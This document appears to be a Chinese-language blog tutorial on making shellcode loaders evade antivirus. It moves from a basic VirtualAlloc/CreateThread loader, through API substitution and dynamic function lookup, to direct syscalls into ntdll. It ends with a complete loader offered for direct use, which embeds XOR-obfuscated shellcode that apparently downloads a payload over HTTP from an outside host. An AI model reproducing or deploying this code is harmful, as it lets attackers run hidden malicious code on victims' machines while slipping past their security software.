# shellcode加载器免杀调试

## 知己知彼-免杀思路

（其实这篇文章屁用没有，就是给自己记录一下。心急的同学直接用最下面的成品就可以了）

目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。

对特征来讲，大多数杀毒软件会定义一个阈值，当文件内部的特征数量达到一定程度就会触发报警，也不排除杀软会针对某个EXP会限制特定的入口函数来查杀。当然还有通过md5，sha1等hash函数来识别恶意软件，这也是最简单粗暴，最容易绕过的。 针对特征的免杀较为好做，可以使用加壳改壳、添加/替换资源、修改已知特征码/会增加查杀概率的单词（比如某函数名为ExecutePayloadshellcode）、加密Shellcode等等。

CreateThread CreateThreadEx

xxx -> ntdll.dll -> win32API

对行为来讲，很多个API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。



## 初级-常见的函数替换手法



利用msf生成calc的shellcode

`msfvenom --payload windows/x64/exec cmd="calc" --format c  --platform windows --bad "\x00" --smallest --arch x64`

使用倾旋给的常规加载器

``` cpp
#include <Windows.h>


// 入口函数
int wmain(int argc, TCHAR* argv[]) {

    int shellcode_size = 0; // shellcode长度
    DWORD dwThreadId; // 线程ID
    HANDLE hThread; // 线程句柄
/* length: 800 bytes */

    unsigned char buf[] =
        "\x48\x31\xc9\x48\x81\xe9\xde\xff\xff\xff\x48\x8d\x05\xef\xff"
        "\xff\xff\x48\xbb\x74\x27\x43\x06\xd7\x58\xb2\x16\x48\x31\x58"
        "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x88\x6f\xc0\xe2\x27\xb0"
        "\x72\x16\x74\x27\x02\x57\x96\x08\xe0\x47\x22\x6f\x72\xd4\xb2"
        "\x10\x39\x44\x14\x6f\xc8\x54\xcf\x10\x39\x44\x54\x6f\xc8\x74"
        "\x87\x10\xbd\xa1\x3e\x6d\x0e\x37\x1e\x10\x83\xd6\xd8\x1b\x22"
        "\x7a\xd5\x74\x92\x57\xb5\xee\x4e\x47\xd6\x99\x50\xfb\x26\x66"
        "\x12\x4e\x5c\x0a\x92\x9d\x36\x1b\x0b\x07\x07\xd3\x32\x9e\x74"
        "\x27\x43\x4e\x52\x98\xc6\x71\x3c\x26\x93\x56\x5c\x10\xaa\x52"
        "\xff\x67\x63\x4f\xd6\x88\x51\x40\x3c\xd8\x8a\x47\x5c\x6c\x3a"
        "\x5e\x75\xf1\x0e\x37\x1e\x10\x83\xd6\xd8\x66\x82\xcf\xda\x19"
        "\xb3\xd7\x4c\xc7\x36\xf7\x9b\x5b\xfe\x32\x7c\x62\x7a\xd7\xa2"
        "\x80\xea\x52\xff\x67\x67\x4f\xd6\x88\xd4\x57\xff\x2b\x0b\x42"
        "\x5c\x18\xae\x5f\x75\xf7\x02\x8d\xd3\xd0\xfa\x17\xa4\x66\x1b"
        "\x47\x8f\x06\xeb\x4c\x35\x7f\x02\x5f\x96\x02\xfa\x95\x98\x07"
        "\x02\x54\x28\xb8\xea\x57\x2d\x7d\x0b\x8d\xc5\xb1\xe5\xe9\x8b"
        "\xd8\x1e\x4e\x6d\x59\xb2\x16\x74\x27\x43\x06\xd7\x10\x3f\x9b"
        "\x75\x26\x43\x06\x96\xe2\x83\x9d\x1b\xa0\xbc\xd3\x6c\xa8\x07"
        "\xb4\x22\x66\xf9\xa0\x42\xe5\x2f\xe9\xa1\x6f\xc0\xc2\xff\x64"
        "\xb4\x6a\x7e\xa7\xb8\xe6\xa2\x5d\x09\x51\x67\x55\x2c\x6c\xd7"
        "\x01\xf3\x9f\xae\xd8\x96\x65\xb6\x34\xd1\x16";
    // 获取shellcode大小
    shellcode_size = sizeof(buf);

    /*
    VirtualAlloc(
        NULL, // 基址
        800,  // 大小
        MEM_COMMIT, // 内存页状态
        PAGE_EXECUTE_READWRITE // 可读可写可执行
        );
    */

    char* shellcode = (char*)VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
    // 将shellcode复制到可执行的内存页中
    CopyMemory(shellcode, buf, shellcode_size);

    hThread = CreateThread(
        NULL, // 安全描述符
        NULL, // 栈的大小
        (LPTHREAD_START_ROUTINE)shellcode, // 函数
        NULL, // 参数
        NULL, // 线程标志
        &dwThreadId // 线程ID
    );

    WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束
    return 0;
}
```

可以看到，shellcode加载器的必经流程：

```cpp
VirtualAlloc  //创建一块内存空间并标记为可读写执行
MemeryCopy    //向创建的内存空间中写入自己的shellcode
CreateThread  //将程序执行的流程指向这块内存空间
```

### 申请内存模块替换


```cpp
    char* shellcode = (char*)VirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );
```

```cpp
//将VirtualAlloc替换成HeapCreate/HeapAlloc
HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(Shellcode), sizeof(Shellcode));
char * BUFFER = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(Shellcode));

memcpy(BUFFER, Shellcode, sizeof(Shellcode));
(*(void(*)())BUFFER)();//多了个指针
```





### 等价替换的内存写入的模块

```cpp
CopyMemory(shellcode, buf, shellcode_size);
```

```cpp
memcpy(shellcode, buf, shellcode_size);
```

```cpp
WriteProcessMemory 
```



### 等价替换跳转内存入口的触发模块

```cpp
((void(*)())shellcode)();
```

```cpp
    hThread = CreateThread(
        NULL, // 安全描述符
        NULL, // 栈的大小
        (LPTHREAD_START_ROUTINE)shellcode, // 函数
        NULL, // 参数
        NULL, // 线程标志
        &dwThreadId // 线程ID
    );

    WaitForSingleObject(hThread, INFINITE); // 一直等待线程执行结束
```

```cpp

//第一种方法   
void RunShellCode_1()
{
 
	PVOID p = NULL;
	if ((p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
		MessageBoxA(NULL, "申请内存失败", "提醒", MB_OK);
	if (!(memcpy(p, shellcode, sizeof(shellcode))))
		MessageBoxA(NULL, "写内存失败", "提醒", MB_OK);
 
	CODE code =(CODE)p;
 
	code();
 
}
 
//第二种方法   
void RunShellCode_2()
{
	((void(*)(void))&shellcode)();
}
 
//第三种方法
void RunShellCode_3()
{
	__asm
	{
		lea eax, shellcode;
		jmp eax;
	}
}
 
//第四种方法   
void RunShellCode_4()
{
	__asm
	{
		mov eax, offset shellcode;
		jmp eax;
	}
}
 
//第五种方法   
void RunShellCode_5()
{
	__asm
	{
		mov eax, offset shellcode;
		_emit 0xFF;
		_emit 0xE0;
	}
}

```



## 中级-利用动态调用获取函数

### 动态获取函数基址

我们可以简单了理解为：函数可以被封装在exe、dll里，而dll中的函数可以理解为像.h的头文件一样供人调用。我们使用的敏感函数也不例外，VirtualAlloc被放在kernel32.dll里面。那么我们直接去找dll要函数地址不就可以往更底层方向去调用函数从而绕过杀软了嘛。

利用GetModuleHandle(等价于LoadLibrary)和GetProcAddress获取指定Dll中的函数基址，利用指针指向函数地址来直接调用。可以理解为重命名了函数名达到免杀目的。(再配合一些小trick如字符串分离就更好了)

---

原理：

GetModuleHandle(等价于LoadLibrary)和GetProcAddress，前者用于获得DLL的句柄，后者用于获得DLL中例程的地址，这种方式之所以被称为动态的，是因为它不需要在程序的开始处把要引入的例程全部列出，只要在调用前引入，并且LoadLibrary可以指定不同的DLL，GetProcAddress可以指定不同的例程，最重要的是如果指定的DLL出错，最多是API调用失败，但不会导致程序终止，因此我们应该在程序中监视DLL的返回值，根据返回值作出相应的处理。

---





```cpp
//头文件定义
typedef LPVOID(WINAPI* ImportVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );


//入口函数下动态获取
  	ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "VirtualAlloc");
/*使用字符串分割的技巧可以进一步减少静态字符串特征
    wchar_t kernel32_str[] = { 'k','e','r','n','e','l','3','2',0 };
    char virtualalloc_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0 };
    ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(kernel32_str), virtualalloc_str);
*/
    char* shellcode = (char*)MyVirtualAlloc(
        NULL,
        shellcode_size,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE//也可以先申请只读，再利用
    );
```

## 高级-系统调用免杀

还记得之前学过的kernel32.dll里的VirtualAlloc函数吗？其实这个只是在用户态的函数，本体是ntdll中被封装起来的NtVirtualAlloc(只不过这里我们用另一个更少见的NtAllocateVirtualMemory函数)。ntdll是系统态的动态链接库，一切系统函数的根源都源自于它内部的基本函数的组合、改造、封装。这里我们就需要写个函数使用syscall去调用。

思路：重新实现一个函数替代GetProcAddress用来对动态链接库抓取函数基址，再写一个函数跳入系统调用去调取ntdll。（再配合小trick分段覆盖shellcode、异或还原等效果更佳）

---

推荐阅读一下相关文章了解原理：



https://blog.csdn.net/tian5753/article/details/80887470

应用程序的代码运行在最低运行级别上ring3上，不能做受控操作。如果要做，比如要访问磁盘，写文件，那就要通过执行系统调用（函数），执行系统调用的时候，CPU的运行级别会发生从ring3到ring0的切换，并跳转到系统调用对应的内核代码位置执行，这样内核就为你完成了设备访问，完成之后再从ring0返回ring3。这个过程也称作用户态和内核态的切换。 （杀软的HOOK监测程序调用API是运行在ring3上的，所以对ring0的系统调用不起作用）

以下是其他一些和代码更贴近的文章：

https://paper.seebug.org/1413/#_2

https://modexp.wordpress.com/2020/06/01/syscalls-disassembler/

https://br-sn.github.io/Implementing-Syscalls-In-The-CobaltStrike-Artifact-Kit/

---

### 实现代码+小trick

```c++
#include <Windows.h>
#pragma comment(linker,"/subsystem:windows /entry:mainCRTStartup")


//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口  
//#pragma comment(linker,"/MERGE:.rdata=.text /MERGE:.data=.text /SECTION:.text,EWR")//减小编译体积  

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

typedef NTSTATUS(NTAPI* pCopyMemory)(PVOID Destination, CONST VOID* Source, SIZE_T Length);

typedef size_t(WINAPI* Importstrlen)(
	const char* string
	);

ULONG64 rva2ofs(PIMAGE_NT_HEADERS nt, DWORD rva) {
	PIMAGE_SECTION_HEADER sh;
	int                   i;

	if (rva == 0) return -1;

	sh = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader +
		nt->FileHeader.SizeOfOptionalHeader);

	for (i = nt->FileHeader.NumberOfSections - 1; i >= 0; i--) {
		if (sh[i].VirtualAddress <= rva &&
			rva <= (DWORD)sh[i].VirtualAddress + sh[i].SizeOfRawData)
		{
			return sh[i].PointerToRawData + rva - sh[i].VirtualAddress;
		}
	}
	return -1;
}

LPVOID GetProcAddress2(LPBYTE hModule, LPCSTR lpProcName)
{
	PIMAGE_DOS_HEADER       dos;
	PIMAGE_NT_HEADERS       nt;
	PIMAGE_DATA_DIRECTORY   dir;
	PIMAGE_EXPORT_DIRECTORY exp;
	DWORD                   rva, ofs, cnt;
	PCHAR                   str;
	PDWORD                  adr, sym;
	PWORD                   ord;
	if (hModule == NULL || lpProcName == NULL) return NULL;
	dos = (PIMAGE_DOS_HEADER)hModule;
	nt = (PIMAGE_NT_HEADERS)(hModule + dos->e_lfanew);
	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
	// no exports? exit
	rva = dir[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	if (rva == 0) return NULL;
	ofs = rva2ofs(nt, rva);
	if (ofs == -1) return NULL;
	// no exported symbols? exit
	exp = (PIMAGE_EXPORT_DIRECTORY)(ofs + hModule);
	cnt = exp->NumberOfNames;
	if (cnt == 0) return NULL;
	// read the array containing address of api names
	ofs = rva2ofs(nt, exp->AddressOfNames);
	if (ofs == -1) return NULL;
	sym = (PDWORD)(ofs + hModule);
	// read the array containing address of api
	ofs = rva2ofs(nt, exp->AddressOfFunctions);
	if (ofs == -1) return NULL;
	adr = (PDWORD)(ofs + hModule);
	// read the array containing list of ordinals
	ofs = rva2ofs(nt, exp->AddressOfNameOrdinals);
	if (ofs == -1) return NULL;
	ord = (PWORD)(ofs + hModule);
	// scan symbol array for api string
	do {
		str = (PCHAR)(rva2ofs(nt, sym[cnt - 1]) + hModule);
		// found it?
		if (strcmp(str, lpProcName) == 0) {
			// return the address
			return (LPVOID)(rva2ofs(nt, adr[ord[cnt - 1]]) + hModule);
		}
	} while (--cnt);
	return NULL;
}

#define NTDLL_PATH "%SystemRoot%\\system32\\NTDLL.dll"

LPVOID GetSyscallStub(LPCSTR lpSyscallName)
{
	HANDLE                        file = NULL, map = NULL;
	LPBYTE                        mem = NULL;
	LPVOID                        cs = NULL;
	PIMAGE_DOS_HEADER             dos;
	PIMAGE_NT_HEADERS             nt;
	PIMAGE_DATA_DIRECTORY         dir;
	PIMAGE_RUNTIME_FUNCTION_ENTRY rf;
	ULONG64                       ofs, start = 0, end = 0, addr;
	SIZE_T                        len;
	DWORD                         i, rva;
	CHAR                          path[MAX_PATH];
	ExpandEnvironmentStringsA(NTDLL_PATH, path, MAX_PATH);
	// open file
	file = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) { goto cleanup; }
	// create mapping
	map = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
	if (map == NULL) { goto cleanup; }
	// create view
	mem = (LPBYTE)MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
	if (mem == NULL) { goto cleanup; }
	// try resolve address of system call
	addr = (ULONG64)GetProcAddress2(mem, lpSyscallName);
	if (addr == 0) { goto cleanup; }
	dos = (PIMAGE_DOS_HEADER)mem;
	nt = (PIMAGE_NT_HEADERS)((PBYTE)mem + dos->e_lfanew);
	dir = (PIMAGE_DATA_DIRECTORY)nt->OptionalHeader.DataDirectory;
	// no exception directory? exit
	rva = dir[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
	if (rva == 0) { goto cleanup; }
	ofs = rva2ofs(nt, rva);
	if (ofs == -1) { goto cleanup; }
	rf = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(ofs + mem);
	// for each runtime function (there might be a better way??)
	for (i = 0; rf[i].BeginAddress != 0; i++) {
		// is it our system call?
		start = rva2ofs(nt, rf[i].BeginAddress) + (ULONG64)mem;
		if (start == addr) {
			// save the end and calculate length
			end = rva2ofs(nt, rf[i].EndAddress) + (ULONG64)mem;
			len = (SIZE_T)(end - start);
			// allocate RWX memory
			cs = VirtualAlloc(NULL, len,
				MEM_COMMIT | MEM_RESERVE,
				PAGE_EXECUTE_READWRITE);
			if (cs != NULL) {
				// copy system call code stub to memory
				CopyMemory(cs, (const void*)start, len);
			}
			break;
		}
	}
cleanup:
	if (mem != NULL) UnmapViewOfFile(mem);
	if (map != NULL) CloseHandle(map);
	if (file != NULL) CloseHandle(file);
	// return pointer to code stub or NULL
	return cs;
}

int main(int argc, TCHAR* argv[]) {
	//获取函数
	char NtAllocateVirtualMemory_str[] = {'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0};
	char RtlMoveMemory_str[] = { 'R','t','l','M','o','v','e','M','e','m','o','r','y',0 };

	pNtAllocateVirtualMemory fnNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetSyscallStub("NtAllocateVirtualMemory");
	pCopyMemory fnCopyMemory = (pCopyMemory)GetSyscallStub("RtlMoveMemory");//CopyMemory是kernel32中对ntdll中RtlMoveMemory的再封装

	int shellcode_size = 0; // shellcode长度

/* length: 800 bytes */
	
	unsigned char buf[] =
		"\xf4\x42\x89\xee\xfa\xe2\xc2\x0a\x0a\x0a\x4b\x5b\x4b\x5a\x58\x5b\x5c\x42\x3b\xd8\x6f\x42\x81\x58\x6a\x42\x81\x58\x12\x42\x81\x58\x2a\x42\x81\x78\x5a\x42\x05\xbd\x40\x40\x47\x3b\xc3\x42\x3b\xca\xa6\x36\x6b\x76\x08\x26\x2a\x4b\xcb\xc3\x07\x4b\x0b\xcb\xe8\xe7\x58\x4b\x5b\x42\x81\x58\x2a\x81\x48\x36\x42\x0b\xda\x6c\x8b\x72\x12\x01\x08\x7f\x78\x81\x8a\x82\x0a\x0a\x0a\x42\x8f\xca\x7e\x6d\x42\x0b\xda\x5a\x81\x42\x12\x4e\x81\x4a\x2a\x43\x0b\xda\xe9\x5c\x42\xf5\xc3\x4b\x81\x3e\x82\x42\x0b\xdc\x47\x3b\xc3\x42\x3b\xca\xa6\x4b\xcb\xc3\x07\x4b\x0b\xcb\x32\xea\x7f\xfb\x46\x09\x46\x2e\x02\x4f\x33\xdb\x7f\xd2\x52\x4e\x81\x4a\x2e\x43\x0b\xda\x6c\x4b\x81\x06\x42\x4e\x81\x4a\x16\x43\x0b\xda\x4b\x81\x0e\x82\x42\x0b\xda\x4b\x52\x4b\x52\x54\x53\x50\x4b\x52\x4b\x53\x4b\x50\x42\x89\xe6\x2a\x4b\x58\xf5\xea\x52\x4b\x53\x50\x42\x81\x18\xe3\x45\xf5\xf5\xf5\x57\x60\x0a\x43\xb4\x7d\x63\x64\x63\x64\x6f\x7e\x0a\x4b\x5c\x43\x83\xec\x46\x83\xfb\x4b\xb0\x46\x7d\x2c\x0d\xf5\xdf\x42\x3b\xc3\x42\x3b\xd8\x47\x3b\xca\x47\x3b\xc3\x4b\x5a\x4b\x5a\x4b\xb0\x30\x5c\x73\xad\xf5\xdf\xe3\x99\x0a\x0a\x0a\x50\x42\x83\xcb\x4b\xb2\xb1\x0b\x0a\x0a\x47\x3b\xc3\x4b\x5b\x4b\x5b\x60\x09\x4b\x5b\x4b\xb0\x5d\x83\x95\xcc\xf5\xdf\xe1\x73\x51\x42\x83\xcb\x42\x3b\xd8\x43\x83\xd2\x47\x3b\xc3\x58\x62\x0a\x38\xca\x8e\x58\x58\x4b\xb0\xe1\x5f\x24\x31\xf5\xdf\x42\x83\xcc\x42\x89\xc9\x5a\x60\x00\x55\x42\x83\xfb\xb0\x15\x0a\x0a\x0a\x60\x0a\x62\x8a\x39\x0a\x0a\x43\x83\xea\x4b\xb3\x0e\x0a\x0a\x0a\x4b\xb0\x7f\x4c\x94\x8c\xf5\xdf\x42\x83\xfb\x42\x83\xd0\x43\xcd\xca\xf5\xf5\xf5\xf5\x47\x3b\xc3\x58\x58\x4b\xb0\x27\x0c\x12\x71\xf5\xdf\x8f\xca\x05\x8f\x97\x0b\x0a\x0a\x42\xf5\xc5\x05\x8e\x86\x0b\x0a\x0a\xe1\xb9\xe3\xee\x0b\x0a\x0a\xe2\x88\xf5\xf5\xf5\x25\x47\x63\x69\x78\x65\x79\x65\x6c\x7e\x4e\x65\x69\x79\x25\x6b\x70\x7f\x78\x6f\x27\x6e\x65\x69\x79\x27\x7a\x78\x25\x68\x66\x65\x68\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x0a\x49\x65\x64\x64\x6f\x69\x7e\x63\x65\x64\x30\x2a\x41\x6f\x6f\x7a\x27\x4b\x66\x63\x7c\x6f\x07\x00\x49\x65\x64\x7e\x6f\x64\x7e\x27\x5e\x73\x7a\x6f\x30\x2a\x2a\x7e\x6f\x72\x7e\x25\x62\x7e\x67\x66\x26\x6b\x7a\x7a\x66\x63\x69\x6b\x7e\x63\x65\x64\x25\x72\x62\x7e\x67\x66\x21\x72\x67\x66\x26\x6b\x7a\x7a\x66\x63\x69\x6b\x7e\x63\x65\x64\x25\x72\x67\x66\x07\x00\x5f\x79\x6f\x78\x27\x4b\x6d\x6f\x64\x7e\x30\x2a\x47\x43\x49\x58\x45\x59\x45\x4c\x5e\x55\x4e\x4f\x5c\x43\x49\x4f\x55\x47\x4f\x5e\x4b\x4e\x4b\x5e\x4b\x55\x58\x4f\x5e\x58\x43\x4f\x5c\x4b\x46\x55\x49\x46\x43\x4f\x44\x5e\x07\x00\x59\x45\x4b\x5a\x4b\x69\x7e\x63\x65\x64\x30\x2a\x28\x62\x7e\x7e\x7a\x30\x25\x25\x79\x69\x62\x6f\x67\x6b\x79\x24\x67\x63\x69\x78\x65\x79\x65\x6c\x7e\x24\x69\x65\x67\x25\x7d\x63\x64\x6e\x65\x7d\x79\x67\x6f\x7e\x6b\x6e\x6b\x7e\x6b\x25\x79\x6f\x78\x7c\x63\x69\x6f\x79\x25\x38\x3a\x3a\x3e\x25\x3a\x38\x25\x3b\x38\x25\x6e\x67\x79\x25\x4e\x6f\x7c\x63\x69\x6f\x47\x6f\x7e\x6b\x6e\x6b\x7e\x6b\x59\x6f\x78\x7c\x63\x69\x6f\x25\x4d\x6f\x7e\x4e\x6f\x7c\x63\x69\x6f\x47\x6f\x7e\x6b\x6e\x6b\x7e\x6b\x28\x07\x00\x42\x65\x79\x7e\x30\x2a\x7d\x7d\x7d\x24\x65\x65\x65\x7a\x79\x24\x7e\x61\x07\x00\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x0a\x4b\xb4\xfa\xbf\xa8\x5c\xf5\xdf\x42\x3b\xc3\xb0\x0a\x0a\x4a\x0a\x4b\xb2\x0a\x1a\x0a\x0a\x4b\xb3\x4a\x0a\x0a\x0a\x4b\xb0\x52\xae\x59\xef\xf5\xdf\x42\x99\x59\x59\x42\x83\xed\x42\x83\xfb\x42\x83\xd0\x4b\xb2\x0a\x2a\x0a\x0a\x43\x83\xf3\x4b\xb0\x18\x9c\x83\xe8\xf5\xdf\x42\x89\xce\x2a\x8f\xca\x7e\xbc\x6c\x81\x0d\x42\x0b\xc9\x8f\xca\x7f\xdd\x52\x52\x52\x42\x0f\xfd\x0b\x0a\x0a\x5a\xc9\xe2\x75\xf7\xf5\xf5\x7d\x7d\x7d\x24\x65\x65\x65\x7a\x79\x24\x7e\x61\x0a\x0a\x0a\x0a\x0a";
		
	char first[] = "\xfc";//取第一字节分段复制
	for (int i = 0; i < sizeof(buf); i++)
	{
		buf[i] ^= 0xA;                  //还原异或混淆
	}


	shellcode_size = sizeof(buf);

	LPVOID Memory = NULL;
	SIZE_T uSize = shellcode_size;
	HANDLE hProcess = GetCurrentProcess();
	NTSTATUS status = fnNtAllocateVirtualMemory(hProcess, &Memory, 0, &uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (status != 0)
	{
		return 0;
	}
	fnCopyMemory(buf, first, 1);//覆盖shellcode第一字节
	fnCopyMemory(Memory, buf, shellcode_size); 
	//等价CopyMemory(Memory, buf, shellcode_size);

	((void(*)())Memory)();
	
}
```

